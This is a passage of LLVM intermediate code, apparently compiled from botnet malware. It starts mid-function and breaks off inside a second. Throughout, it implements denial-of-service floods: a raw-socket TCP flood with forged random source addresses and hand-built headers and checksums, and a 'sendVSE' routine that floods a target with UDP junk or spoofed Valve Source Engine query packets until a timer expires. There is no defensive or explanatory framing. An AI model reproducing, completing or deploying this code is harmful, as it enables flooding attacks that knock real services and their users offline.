  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %23 = load i32, i32* %12, align 4
  store i32 %23, i32* %13, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %8, align 4
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %6
  %28 = call i32 @rand_cmwc()
  %29 = trunc i32 %28 to i16
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %29, i16* %30, align 2
  br label %36

; <label>:31:                                     ; preds = %6
  %32 = load i32, i32* %8, align 4
  %33 = trunc i32 %32 to i16
  %34 = call zeroext i16 @htons(i16 zeroext %33) #13
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  br label %36

; <label>:36:                                     ; preds = %31, %27
  %37 = load i8*, i8** %7, align 8
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %39 = call i32 @getHost(i8* %37, %struct.in_addr* %38)
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %36
  br label %235

; <label>:42:                                     ; preds = %36
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 3
  %44 = getelementptr inbounds [8 x i8], [8 x i8]* %43, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 8, i32 4, i1 false)
  %45 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %45, i32* %15, align 4
  %46 = load i32, i32* %15, align 4
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %49, label %48

; <label>:48:                                     ; preds = %42
  br label %235

; <label>:49:                                     ; preds = %42
  store i32 1, i32* %16, align 4
  %50 = load i32, i32* %15, align 4
  %51 = bitcast i32* %16 to i8*
  %52 = call i32 @setsockopt(i32 %50, i32 0, i32 3, i8* %51, i32 4) #2
  %53 = icmp slt i32 %52, 0
  br i1 %53, label %54, label %55

; <label>:54:                                     ; preds = %49
  br label %235

; <label>:55:                                     ; preds = %49
  %56 = load i32, i32* %10, align 4
  %57 = icmp eq i32 %56, 0
  br i1 %57, label %58, label %59

; <label>:58:                                     ; preds = %55
  store i32 0, i32* %17, align 4
  br label %65

; <label>:59:                                     ; preds = %55
  %60 = load i32, i32* %10, align 4
  %61 = sub nsw i32 32, %60
  %62 = shl i32 1, %61
  %63 = sub nsw i32 %62, 1
  %64 = xor i32 %63, -1
  store i32 %64, i32* %17, align 4
  br label %65

; <label>:65:                                     ; preds = %59, %58
  %66 = load i32, i32* %11, align 4
  %67 = sext i32 %66 to i64
  %68 = add i64 40, %67
  %69 = call i8* @llvm.stacksave()
  store i8* %69, i8** %18, align 8
  %70 = alloca i8, i64 %68, align 16
  %71 = bitcast i8* %70 to %struct.iphdr*
  store %struct.iphdr* %71, %struct.iphdr** %19, align 8
  %72 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %73 = bitcast %struct.iphdr* %72 to i8*
  %74 = getelementptr i8, i8* %73, i64 20
  %75 = bitcast i8* %74 to %struct.tcphdr*
  store %struct.tcphdr* %75, %struct.tcphdr** %20, align 8
  %76 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %77 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %78 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %77, i32 0, i32 0
  %79 = load i32, i32* %78, align 4
  %80 = load i32, i32* %17, align 4
  %81 = call i32 @GetRandomIP(i32 %80)
  %82 = call i32 @htonl(i32 %81) #13
  %83 = load i32, i32* %11, align 4
  %84 = sext i32 %83 to i64
  %85 = add i64 20, %84
  %86 = trunc i64 %85 to i32
  call void @makeIPPacket(%struct.iphdr* %76, i32 %79, i32 %82, i8 zeroext 6, i32 %86)
  %87 = call zeroext i16 @htons(i16 zeroext 5678) #13
  %88 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %89 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %88, i32 0, i32 0
  %90 = bitcast %union.anon.0* %89 to %struct.anon.1*
  %91 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %90, i32 0, i32 0
  store i16 %87, i16* %91, align 4
  %92 = call i32 @rand() #2
  %93 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %94 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %93, i32 0, i32 0
  %95 = bitcast %union.anon.0* %94 to %struct.anon.1*
  %96 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %95, i32 0, i32 2
  store i32 %92, i32* %96, align 4
  %97 = call i32 @rand_cmwc()
  %98 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %99 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %98, i32 0, i32 0
  %100 = bitcast %union.anon.0* %99 to %struct.anon.1*
  %101 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %100, i32 0, i32 3
  store i32 %97, i32* %101, align 4
  %102 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %103 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %102, i32 0, i32 0
  %104 = bitcast %union.anon.0* %103 to %struct.anon.1*
  %105 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %104, i32 0, i32 4
  %106 = load i16, i16* %105, align 4
  %107 = and i16 %106, 16383
  store i16 %107, i16* %105, align 4
  %108 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %109 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %108, i32 0, i32 0
  %110 = bitcast %union.anon.0* %109 to %struct.anon.1*
  %111 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %110, i32 0, i32 4
  %112 = load i16, i16* %111, align 4
  %113 = and i16 %112, -241
  %114 = or i16 %113, 80
  store i16 %114, i16* %111, align 4
  %115 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %116 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %115, i32 0, i32 0
  %117 = bitcast %union.anon.0* %116 to %struct.anon.1*
  %118 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %117, i32 0, i32 4
  %119 = load i16, i16* %118, align 4
  %120 = and i16 %119, -513
  %121 = or i16 %120, 512
  store i16 %121, i16* %118, align 4
  %122 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %123 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %122, i32 0, i32 0
  %124 = bitcast %union.anon.0* %123 to %struct.anon.1*
  %125 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %124, i32 0, i32 4
  %126 = load i16, i16* %125, align 4
  %127 = and i16 %126, -4097
  %128 = or i16 %127, 4096
  store i16 %128, i16* %125, align 4
  %129 = call i32 @rand_cmwc()
  %130 = trunc i32 %129 to i16
  %131 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %132 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %131, i32 0, i32 0
  %133 = bitcast %union.anon.0* %132 to %struct.anon.1*
  %134 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %133, i32 0, i32 5
  store i16 %130, i16* %134, align 2
  %135 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %136 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %135, i32 0, i32 0
  %137 = bitcast %union.anon.0* %136 to %struct.anon.1*
  %138 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %137, i32 0, i32 6
  store i16 0, i16* %138, align 4
  %139 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %140 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %139, i32 0, i32 0
  %141 = bitcast %union.anon.0* %140 to %struct.anon.1*
  %142 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %141, i32 0, i32 7
  store i16 0, i16* %142, align 2
  %143 = load i32, i32* %8, align 4
  %144 = icmp eq i32 %143, 0
  br i1 %144, label %145, label %147

; <label>:145:                                    ; preds = %65
  %146 = call i32 @rand_cmwc()
  br label %152

; <label>:147:                                    ; preds = %65
  %148 = load i32, i32* %8, align 4
  %149 = trunc i32 %148 to i16
  %150 = call zeroext i16 @htons(i16 zeroext %149) #13
  %151 = zext i16 %150 to i32
  br label %152

; <label>:152:                                    ; preds = %147, %145
  %153 = phi i32 [ %146, %145 ], [ %151, %147 ]
  %154 = trunc i32 %153 to i16
  %155 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %156 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %155, i32 0, i32 0
  %157 = bitcast %union.anon.0* %156 to %struct.anon.1*
  %158 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %157, i32 0, i32 1
  store i16 %154, i16* %158, align 2
  %159 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %160 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %161 = call zeroext i16 @tcpcsum(%struct.iphdr* %159, %struct.tcphdr* %160)
  %162 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %163 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %162, i32 0, i32 0
  %164 = bitcast %union.anon.0* %163 to %struct.anon.1*
  %165 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %164, i32 0, i32 6
  store i16 %161, i16* %165, align 4
  %166 = bitcast i8* %70 to i16*
  %167 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 2
  %169 = load i16, i16* %168, align 2
  %170 = zext i16 %169 to i32
  %171 = call zeroext i16 @csum(i16* %166, i32 %170)
  %172 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 7
  store i16 %171, i16* %173, align 2
  %174 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %175 = load i32, i32* %9, align 4
  %176 = add nsw i32 %174, %175
  store i32 %176, i32* %21, align 4
  store i32 0, i32* %22, align 4
  br label %177

; <label>:177:                                    ; preds = %230, %229, %152
  br label %178

; <label>:178:                                    ; preds = %177
  %179 = load i32, i32* %15, align 4
  %180 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  %181 = call i64 @sendto(i32 %179, i8* %70, i64 %68, i32 0, %struct.sockaddr* %180, i32 16)
  %182 = load i32, i32* %17, align 4
  %183 = call i32 @GetRandomIP(i32 %182)
  %184 = call i32 @htonl(i32 %183) #13
  %185 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 8
  store i32 %184, i32* %186, align 4
  %187 = call i32 @rand_cmwc()
  %188 = trunc i32 %187 to i16
  %189 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 3
  store i16 %188, i16* %190, align 4
  %191 = call i32 @rand_cmwc()
  %192 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %193 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %192, i32 0, i32 0
  %194 = bitcast %union.anon.0* %193 to %struct.anon.1*
  %195 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %194, i32 0, i32 2
  store i32 %191, i32* %195, align 4
  %196 = call i32 @rand_cmwc()
  %197 = trunc i32 %196 to i16
  %198 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %199 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %198, i32 0, i32 0
  %200 = bitcast %union.anon.0* %199 to %struct.anon.1*
  %201 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %200, i32 0, i32 0
  store i16 %197, i16* %201, align 4
  %202 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %203 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %202, i32 0, i32 0
  %204 = bitcast %union.anon.0* %203 to %struct.anon.1*
  %205 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %204, i32 0, i32 6
  store i16 0, i16* %205, align 4
  %206 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %207 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %208 = call zeroext i16 @tcpcsum(%struct.iphdr* %206, %struct.tcphdr* %207)
  %209 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %210 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %209, i32 0, i32 0
  %211 = bitcast %union.anon.0* %210 to %struct.anon.1*
  %212 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %211, i32 0, i32 6
  store i16 %208, i16* %212, align 4
  %213 = bitcast i8* %70 to i16*
  %214 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 2
  %216 = load i16, i16* %215, align 2
  %217 = zext i16 %216 to i32
  %218 = call zeroext i16 @csum(i16* %213, i32 %217)
  %219 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %220 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %219, i32 0, i32 7
  store i16 %218, i16* %220, align 2
  %221 = load i32, i32* %22, align 4
  %222 = load i32, i32* %13, align 4
  %223 = icmp eq i32 %221, %222
  br i1 %223, label %224, label %230

; <label>:224:                                    ; preds = %178
  %225 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %226 = load i32, i32* %21, align 4
  %227 = icmp sgt i32 %225, %226
  br i1 %227, label %228, label %229

; <label>:228:                                    ; preds = %224
  br label %233

; <label>:229:                                    ; preds = %224
  store i32 0, i32* %22, align 4
  br label %177

; <label>:230:                                    ; preds = %178
  %231 = load i32, i32* %22, align 4
  %232 = add i32 %231, 1
  store i32 %232, i32* %22, align 4
  br label %177

; <label>:233:                                    ; preds = %228
  %234 = load i8*, i8** %18, align 8
  call void @llvm.stackrestore(i8* %234)
  br label %235

; <label>:235:                                    ; preds = %233, %54, %48, %41
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendVSE(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca %struct.sockaddr_in, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.udphdr*, align 8
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  store i8* %0, i8** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 %7, i32* %16, align 4
  store i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.5, i32 0, i32 0), i8** %17, align 8
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 0
  store i16 2, i16* %36, align 4
  %37 = load i32, i32* %10, align 4
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %43

; <label>:39:                                     ; preds = %8
  %40 = call i32 @rand_cmwc()
  %41 = trunc i32 %40 to i16
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 1
  store i16 %41, i16* %42, align 2
  br label %48

; <label>:43:                                     ; preds = %8
  %44 = load i32, i32* %10, align 4
  %45 = trunc i32 %44 to i16
  %46 = call zeroext i16 @htons(i16 zeroext %45) #13
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 1
  store i16 %46, i16* %47, align 2
  br label %48

; <label>:48:                                     ; preds = %43, %39
  %49 = load i8*, i8** %9, align 8
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 2
  %51 = call i32 @getHost(i8* %49, %struct.in_addr* %50)
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %54

; <label>:53:                                     ; preds = %48
  br label %315

; <label>:54:                                     ; preds = %48
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 3
  %56 = getelementptr inbounds [8 x i8], [8 x i8]* %55, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %56, i8 0, i64 8, i32 4, i1 false)
  %57 = load i32, i32* %14, align 4
  store i32 %57, i32* %20, align 4
  %58 = load i32, i32* %12, align 4
  %59 = icmp eq i32 %58, 32
  br i1 %59, label %60, label %120

; <label>:60:                                     ; preds = %54
  %61 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %61, i32* %21, align 4
  %62 = load i32, i32* %21, align 4
  %63 = icmp ne i32 %62, 0
  br i1 %63, label %65, label %64

; <label>:64:                                     ; preds = %60
  br label %315

; <label>:65:                                     ; preds = %60
  %66 = load i32, i32* %13, align 4
  %67 = add nsw i32 %66, 1
  %68 = sext i32 %67 to i64
  %69 = call noalias i8* @malloc(i64 %68) #2
  store i8* %69, i8** %22, align 8
  %70 = load i8*, i8** %22, align 8
  %71 = icmp eq i8* %70, null
  br i1 %71, label %72, label %73

; <label>:72:                                     ; preds = %65
  br label %315

; <label>:73:                                     ; preds = %65
  %74 = load i8*, i8** %22, align 8
  %75 = load i32, i32* %13, align 4
  %76 = add nsw i32 %75, 1
  %77 = sext i32 %76 to i64
  call void @llvm.memset.p0i8.i64(i8* %74, i8 0, i64 %77, i32 1, i1 false)
  %78 = load i8*, i8** %22, align 8
  %79 = load i32, i32* %13, align 4
  call void @RandString(i8* %78, i32 %79)
  %80 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %81 = load i32, i32* %11, align 4
  %82 = add nsw i32 %80, %81
  store i32 %82, i32* %23, align 4
  store i32 0, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %83

; <label>:83:                                     ; preds = %116, %112, %105, %73
  %84 = load i32, i32* %21, align 4
  %85 = load i8*, i8** %22, align 8
  %86 = load i32, i32* %13, align 4
  %87 = sext i32 %86 to i64
  %88 = bitcast %struct.sockaddr_in* %19 to %struct.sockaddr*
  %89 = call i64 @sendto(i32 %84, i8* %85, i64 %87, i32 0, %struct.sockaddr* %88, i32 16)
  %90 = load i32, i32* %24, align 4
  %91 = load i32, i32* %20, align 4
  %92 = icmp eq i32 %90, %91
  br i1 %92, label %93, label %106

; <label>:93:                                     ; preds = %83
  %94 = load i32, i32* %10, align 4
  %95 = icmp eq i32 %94, 0
  br i1 %95, label %96, label %100

; <label>:96:                                     ; preds = %93
  %97 = call i32 @rand_cmwc()
  %98 = trunc i32 %97 to i16
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 1
  store i16 %98, i16* %99, align 2
  br label %100

; <label>:100:                                    ; preds = %96, %93
  %101 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %102 = load i32, i32* %23, align 4
  %103 = icmp sgt i32 %101, %102
  br i1 %103, label %104, label %105

; <label>:104:                                    ; preds = %100
  br label %119

; <label>:105:                                    ; preds = %100
  store i32 0, i32* %24, align 4
  br label %83

; <label>:106:                                    ; preds = %83
  %107 = load i32, i32* %24, align 4
  %108 = add i32 %107, 1
  store i32 %108, i32* %24, align 4
  %109 = load i32, i32* %25, align 4
  %110 = load i32, i32* %15, align 4
  %111 = icmp eq i32 %109, %110
  br i1 %111, label %112, label %116

; <label>:112:                                    ; preds = %106
  %113 = load i32, i32* %16, align 4
  %114 = mul nsw i32 %113, 1000
  %115 = call i32 @usleep(i32 %114)
  store i32 0, i32* %25, align 4
  br label %83

; <label>:116:                                    ; preds = %106
  %117 = load i32, i32* %25, align 4
  %118 = add i32 %117, 1
  store i32 %118, i32* %25, align 4
  br label %83

; <label>:119:                                    ; preds = %104
  br label %315

; <label>:120:                                    ; preds = %54
  %121 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %121, i32* %26, align 4
  %122 = load i32, i32* %26, align 4
  %123 = icmp ne i32 %122, 0
  br i1 %123, label %125, label %124

; <label>:124:                                    ; preds = %120
  br label %315

; <label>:125:                                    ; preds = %120
  store i32 1, i32* %27, align 4
  %126 = load i32, i32* %26, align 4
  %127 = bitcast i32* %27 to i8*
  %128 = call i32 @setsockopt(i32 %126, i32 0, i32 3, i8* %127, i32 4) #2
  %129 = icmp slt i32 %128, 0
  br i1 %129, label %130, label %131

; <label>:130:                                    ; preds = %125
  br label %315

; <label>:131:                                    ; preds = %125
  store i32 50, i32* %28, align 4
  br label %132

; <label>:132:                                    ; preds = %136, %131
  %133 = load i32, i32* %28, align 4
  %134 = add nsw i32 %133, -1
  store i32 %134, i32* %28, align 4
  %135 = icmp ne i32 %133, 0
  br i1 %135, label %136, label %141

; <label>:136:                                    ; preds = %132
  %137 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %138 = call i32 @rand_cmwc()
  %139 = xor i32 %137, %138
  call void @srand(i32 %139) #2
  %140 = call i32 @rand() #2
  call void @init_rand(i32 %140)
  br label %132

; <label>:141:                                    ; preds = %132
  %142 = load i32, i32* %12, align 4
  %143 = icmp eq i32 %142, 0
  br i1 %143, label %144, label %145

; <label>:144:                                    ; preds = %141
  store i32 0, i32* %29, align 4
  br label %151

; <label>:145:                                    ; preds = %141
  %146 = load i32, i32* %12, align 4
  %147 = sub nsw i32 32, %146
  %148 = shl i32 1, %147
  %149 = sub nsw i32 %148, 1
  %150 = xor i32 %149, -1
  store i32 %150, i32* %29, align 4
  br label %151

; <label>:151:                                    ; preds = %145, %144
  %152 = load i32, i32* %13, align 4
  %153 = sext i32 %152 to i64
  %154 = add i64 28, %153
  %155 = call i8* @llvm.stacksave()
  store i8* %155, i8** %30, align 8
  %156 = alloca i8, i64 %154, align 16
  %157 = bitcast i8* %156 to %struct.iphdr*
  store %struct.iphdr* %157, %struct.iphdr** %31, align 8
  %158 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %159 = bitcast %struct.iphdr* %158 to i8*
  %160 = getelementptr i8, i8* %159, i64 20
  %161 = bitcast i8* %160 to %struct.udphdr*
  store %struct.udphdr* %161, %struct.udphdr** %32, align 8
  %162 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %163 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 2
  %164 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %163, i32 0, i32 0
  %165 = load i32, i32* %164, align 4
  %166 = load i32, i32* %29, align 4
  %167 = call i32 @GetRandomIP(i32 %166)
  %168 = call i32 @htonl(i32 %167) #13
  %169 = load i32, i32* %13, align 4
  %170 = sext i32 %169 to i64
  %171 = add i64 8, %170
  %172 = trunc i64 %171 to i32
  call void @makeVSEPacket(%struct.iphdr* %162, i32 %165, i32 %168, i8 zeroext 17, i32 %172)
  %173 = load i32, i32* %13, align 4
  %174 = sext i32 %173 to i64
  %175 = add i64 8, %174
  %176 = load i32, i32* %18, align 4
  %177 = sext i32 %176 to i64
  %178 = add i64 %175, %177
  %179 = trunc i64 %178 to i16
  %180 = call zeroext i16 @htons(i16 zeroext %179) #13
  %181 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %182 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %181, i32 0, i32 0
  %183 = bitcast %union.anon.2* %182 to %struct.anon.3*
  %184 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %183, i32 0, i32 2
  store i16 %180, i16* %184, align 2
  %185 = call i32 @rand_cmwc()
  %186 = trunc i32 %185 to i16
  %187 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %188 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %187, i32 0, i32 0
  %189 = bitcast %union.anon.2* %188 to %struct.anon.3*
  %190 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %189, i32 0, i32 0
  store i16 %186, i16* %190, align 2
  %191 = load i32, i32* %10, align 4
  %192 = icmp eq i32 %191, 0
  br i1 %192, label %193, label %195

; <label>:193:                                    ; preds = %151
  %194 = call i32 @rand_cmwc()
  br label %200

; <label>:195:                                    ; preds = %151
  %196 = load i32, i32* %10, align 4
  %197 = trunc i32 %196 to i16
  %198 = call zeroext i16 @htons(i16 zeroext %197) #13
  %199 = zext i16 %198 to i32
  br label %200

; <label>:200:                                    ; preds = %195, %193
  %201 = phi i32 [ %194, %193 ], [ %199, %195 ]
  %202 = trunc i32 %201 to i16
  %203 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %204 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %203, i32 0, i32 0
  %205 = bitcast %union.anon.2* %204 to %struct.anon.3*
  %206 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %205, i32 0, i32 1
  store i16 %202, i16* %206, align 2
  %207 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %208 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %207, i32 0, i32 0
  %209 = bitcast %union.anon.2* %208 to %struct.anon.3*
  %210 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %209, i32 0, i32 3
  store i16 0, i16* %210, align 2
  %211 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %212 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %213 = bitcast %struct.udphdr* %212 to i8*
  %214 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %215 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %214, i32 0, i32 0
  %216 = bitcast %union.anon.2* %215 to %struct.anon.3*
  %217 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %216, i32 0, i32 2
  %218 = load i16, i16* %217, align 2
  %219 = load i32, i32* %18, align 4
  %220 = sext i32 %219 to i64
  %221 = add i64 12, %220
  %222 = trunc i64 %221 to i32
  %223 = call zeroext i16 @checksum_tcp_udp(%struct.iphdr* %211, i8* %213, i16 zeroext %218, i32 %222)
  %224 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %225 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %224, i32 0, i32 0
  %226 = bitcast %union.anon.2* %225 to %struct.anon.3*
  %227 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %226, i32 0, i32 3
  store i16 %223, i16* %227, align 2
  %228 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %229 = bitcast %struct.udphdr* %228 to i8*
  %230 = getelementptr inbounds i8, i8* %229, i64 8
  %231 = load i32, i32* %13, align 4
  call void @RandString(i8* %230, i32 %231)
  %232 = bitcast i8* %156 to i16*
  %233 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %234 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %233, i32 0, i32 2
  %235 = load i16, i16* %234, align 2
  %236 = zext i16 %235 to i32
  %237 = call zeroext i16 @csum(i16* %232, i32 %236)
  %238 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %239 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %238, i32 0, i32 7
  store i16 %237, i16* %239, align 2
  %240 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %241 = load i32, i32* %11, align 4
  %242 = add nsw i32 %240, %241
  store i32 %242, i32* %33, align 4
  store i32 0, i32* %34, align 4
  store i32 0, i32* %35, align 4
  br label %243

; <label>:243:                                    ; preds = %310, %306, %299, %200
  br label %244

; <label>:244:                                    ; preds = %243
  %245 = load i32, i32* %26, align 4
  %246 = load i32, i32* %18, align 4
  %247 = sext i32 %246 to i64
  %248 = add i64 32, %247
  %249 = trunc i64 %154 to i32
  %250 = bitcast %struct.sockaddr_in* %19 to %struct.sockaddr*
  %251 = call i64 @sendto(i32 %245, i8* %156, i64 %248, i32 %249, %struct.sockaddr* %250, i32 16)
  %252 = call i32 @rand_cmwc()
  %253 = trunc i32 %252 to i16
  %254 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %255 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %254, i32 0, i32 0
  %256 = bitcast %union.anon.2* %255 to %struct.anon.3*
  %257 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %256, i32 0, i32 0
  store i16 %253, i16* %257, align 2
  %258 = load i32, i32* %10, align 4
  %259 = icmp eq i32 %258, 0
  br i1 %259, label %260, label %262

; <label>:260:                                    ; preds = %244
  %261 = call i32 @rand_cmwc()
  br label %267

; <label>:262:                                    ; preds = %244
  %263 = load i32, i32* %10, align 4
  %264 = trunc i32 %263 to i16
  %265 = call zeroext i16 @htons(i16 zeroext %264) #13
  %266 = zext i16 %265 to i32
  br label %267

; <label>:267:                                    ; preds = %262, %260
  %268 = phi i32 [ %261, %260 ], [ %266, %262 ]
  %269 = trunc i32 %268 to i16
